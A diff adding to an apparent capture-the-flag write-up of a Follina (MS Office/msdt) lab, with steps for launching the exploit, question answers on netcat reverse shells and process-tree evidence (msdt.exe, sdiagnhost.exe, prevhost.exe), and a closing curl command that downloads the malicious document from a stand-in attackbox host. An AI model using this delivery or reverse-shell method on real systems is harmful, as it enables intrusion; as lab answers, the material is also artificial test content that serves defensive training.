@@ -199,6 +199,24 @@ Combining the two and then abusing them will result in an attack vector that weâ
 
 <h3 align="left"> Answer the questions below</h3>
 
+<p><em>Launched the Exploit</em> and <em>Started an HTTP Server</em></p>
+
+<img width="865" height="296" alt="image" src="https://github.com/user-attachments/assets/2d4785f0-2f83-40a8-b527-bc310ed9c4f6" />
+
+<p><em>Started the Windows VM</em>, <em>Waited fot it to Initialize</em> and <em>Opened Command Prompt</em>/p>
+
+<img width="795" height="77" alt="image" src="https://github.com/user-attachments/assets/5123a082-174c-46e5-b983-585defe8f9cb" />
+
+<p><em>Downloaded the Maldoc</em></p>
+
+<img width="1062" height="203" alt="image" src="https://github.com/user-attachments/assets/b2458c64-4c5b-477c-9ce5-4bc4fcf20a94" />
+
+<p><em>Double-clicked over the <code>follina</code> file</em></p>
+
+<img width="1110" height="331" alt="image" src="https://github.com/user-attachments/assets/61893017-dccd-4acc-b5ef-8f1a97863879" />
+
+<br>
+
 <p>4.1. What application got executed upon opening of the maldoc that signified compromise? Answer format is "<app>.exe"<br>
 <code>win32calc.exe</code></p>
 
@@ -210,5 +228,64 @@ Combining the two and then abusing them will result in an attack vector that weâ
 
 Fun fact: The last part of the filename is actually the area code of Follina, Italy which is where this vulnerability got it's name from. <em> Hint : External Research Required<br>
 <code>05-2022-0438.doc</code></p>
+
+<br>
+
+<p>4.3. The PoC that we used has the capability to establish a reverse shell upon exploit - what binary is being used to accomplish this? <em>Check the follina.py file</em><br>
+<code>netcat</code></p>
+
+<img width="1221" height="88" alt="image" src="https://github.com/user-attachments/assets/1add9e8b-5922-439c-b217-f23f56207c61" />
+
+
+<br>
+
+<p>4.4. Where is this binary being downloaded?<br>
+<code>C:\Windows\Tasks</code></p>
+
+
+<img width="1259" height="162" alt="image" src="https://github.com/user-attachments/assets/4780ea8f-8444-4f6f-9982-277589af60b0" />
+
+<br>
+
+<p>4.5. In the original exploit execution, two parent processes are of interest in the list of running processes in Process Explorer, one of them is WINWORD.EXE. Can you find the other one?<br>
+<code>sdiagnhost.exe</code></p>
+
+<p><em>Launched </em>Sysinternals Process Explorer</em></p>
+
+<img width="1077" height="341" alt="image" src="https://github.com/user-attachments/assets/e619db97-398a-43f0-acfd-c7a5412c3a7b" />
+
+<br>
+
+<p>4.6. What is the child process of WINWORD.EXE?<br>
+<code>msdt.exe</code></p>
+
+<img width="1076" height="450" alt="image" src="https://github.com/user-attachments/assets/e8e58f97-2111-4e5f-90ce-328bee22cbc2" />
+
+<br>
+
+<p>4.7. What is the child process of the other interesting parent process?<br>
+<code>conhost.exe</code></p>
+
+<img width="1076" height="236" alt="image" src="https://github.com/user-attachments/assets/4baa7860-280f-4c12-a41d-9a641e5d5f2f" />
+
+<br>
+
+<p>4.8. What process would be the most obvious piece of evidence to conclude that the "Zero Click" implementation of the exploit was used?<br>
+<code>prevhost.exe</code></p>
+
+<img width="770" height="231" alt="image" src="https://github.com/user-attachments/assets/ef2b62ca-18c5-4e69-b521-8edbc9e1da11" />
+
+
+
+
+
+```bash
+Microsoft Windows [Version]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator> cd Desktop
+C:\Users\Administrator\Desktop> curl http://[attackbox IP]:3456/follina.doc -o follina.docx
+```
+
 
 
